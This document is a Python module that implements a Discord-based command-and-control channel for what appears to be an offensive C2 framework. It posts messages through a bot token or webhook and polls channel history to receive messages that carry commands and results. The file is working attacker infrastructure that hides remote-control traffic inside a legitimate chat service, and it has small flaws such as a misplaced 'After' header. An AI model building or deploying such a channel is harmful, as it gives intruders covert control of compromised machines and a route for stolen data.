"""Discord channel adapter (Bot REST API, no gateway dependency).

Credentials: ``discord_token`` plus ``discord_channel_id`` from
``payload.json``. Outbound may optionally use ``discord_webhook`` when
set; inbound always reads the channel history with the bot token.
"""

from __future__ import annotations

import requests

from core.protocols import C2Message
from modules.c2_channels.base import HttpC2Channel

API_BASE = "https://discord.com/api/v10"


class DiscordC2Channel(HttpC2Channel):
    """Discord REST transport (webhook send + channel history polling)."""

    name = "discord"

    def __init__(self, config: dict) -> None:
        self._token = ""
        self._channel_id = ""
        self._webhook = ""
        self._last_message_id = ""
        super().__init__(config)

    def _resolve_credentials(self) -> bool:
        self._token = str(self._config.get("discord_token", "") or "").strip()
        self._channel_id = str(self._config.get("discord_channel_id", "") or "").strip()
        self._webhook = str(self._config.get("discord_webhook", "") or "").strip()
        return bool(self._token) and bool(self._channel_id)

    def _headers(self) -> dict[str, str]:
        headers = {"Authorization": f"Bot {self._token}"}
        if self._last_message_id:
            headers["After"] = self._last_message_id
        return headers

    def _send_request(self, text: str) -> requests.Response:
        if self._webhook:
            return requests.post(  # noqa: S113
                self._webhook, json={"content": text}, timeout=10.0
            )
        return requests.post(  # noqa: S113
            f"{API_BASE}/channels/{self._channel_id}/messages",
            headers={"Authorization": f"Bot {self._token}"},
            json={"content": text},
            timeout=10.0,
        )

    def _poll_request(self, limit: int) -> list[C2Message]:
        response = requests.get(  # noqa: S113
            f"{API_BASE}/channels/{self._channel_id}/messages",
            headers=self._headers(),
            params={"limit": limit},
            timeout=15.0,
        )
        entries = response.json() if isinstance(response.json(), list) else []
        messages: list[C2Message] = []
        for entry in reversed(entries):
            message_id = str(entry.get("id", "") or "")
            author = str((entry.get("author") or {}).get("id", "") or "")
            text = str(entry.get("content", "") or "")
            if message_id:
                self._last_message_id = max(self._last_message_id, message_id)
            if text and author:
                messages.append(C2Message(channel=self.name, sender=author, text=text))
        return messages
